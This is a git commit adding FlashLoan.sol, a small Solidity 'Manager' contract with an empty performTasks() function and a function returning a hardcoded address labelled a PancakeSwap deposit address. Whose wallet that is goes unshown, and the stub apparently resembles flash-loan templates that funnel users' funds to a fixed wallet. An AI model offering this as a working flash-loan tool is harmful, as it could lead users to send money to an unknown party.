f2f57ce68203f0976060f381dc406a493ee773a8
Cryptoroot33 <88247480+Cryptoroot33@users.noreply.github.com>
2021-08-06 01:54:35 -0300

    Add files via upload

---
+++ FlashLoan.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public {
+
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0x397DdbA070B58a3A7B6ab8bd8dfdF0aFB62435ca;
+	}
+}
